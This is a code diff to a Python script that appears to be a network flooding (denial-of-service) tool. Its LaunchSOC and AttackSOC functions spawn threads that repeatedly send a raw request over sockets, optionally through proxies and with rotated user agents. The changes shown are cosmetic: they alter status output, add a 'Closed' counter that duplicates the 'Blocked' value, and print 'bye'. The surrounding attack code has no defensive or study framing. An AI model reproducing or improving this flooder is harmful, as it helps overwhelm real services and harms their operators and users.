@@ -24,7 +24,7 @@ def LaunchSOC(th):
             try:
                 thd = threading.Thread(target=AttackSOC, args=(req,))
                 thd.start()
-                print("" + Fore.LIGHTBLACK_EX + thd.name)
+                print("" + Fore.LIGHTBLACK_EX + thd.name + Fore.RESET + "", end='\r')
             except:
                 pass
     elif proxy == 1:
@@ -49,7 +49,7 @@ def AttackSOC(req):
                 for _ in range(100):
                     s.send(str.encode(req))
                     rs = rs + 1
-                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs} Blocked: {closed}" + Fore.RESET + "", end='\r')
+                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs} Blocked: {closed} Closed: {closed}" + Fore.RESET + "", end='\r')
             except:
                 closed = closed + 1
                 s.close()
@@ -102,3 +102,4 @@ if __name__ == '__main__':
     proxy = int(input("Proxy: "))
     ua = open('./ua.txt', 'r').read().split('\n')
     LaunchSOC(th)
+    print('bye')
